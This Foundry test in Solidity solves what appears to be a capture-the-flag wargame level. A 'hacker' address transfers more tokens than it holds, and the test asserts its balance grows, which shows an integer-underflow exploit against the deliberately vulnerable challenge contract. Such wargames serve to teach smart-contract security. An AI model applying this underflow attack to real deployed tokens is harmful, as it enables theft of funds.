// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Token} from "../src/05_Token/Token.sol";

contract Token_Solutions is Test {
    Token TokenContract;

    address public owner;
    address public hacker;
    address public dummy;

    function setUp() public {
        owner = makeAddr("owner");

        vm.prank(owner);
        TokenContract = new Token(210000);

        hacker = makeAddr("hacker");
        dummy = makeAddr("dummy");

        vm.prank(owner);
        TokenContract.transfer(hacker, 20);
    }

    function test_attack() public {
        console.log("Balance before:", TokenContract.balanceOf(hacker));

        vm.prank(hacker);

        TokenContract.transfer(dummy, 21);

        uint256 hackerBalance = TokenContract.balanceOf(hacker);
        console.log("Balance after:", hackerBalance);

        assertGt(hackerBalance, 20, "Hack failed!");
    }
}
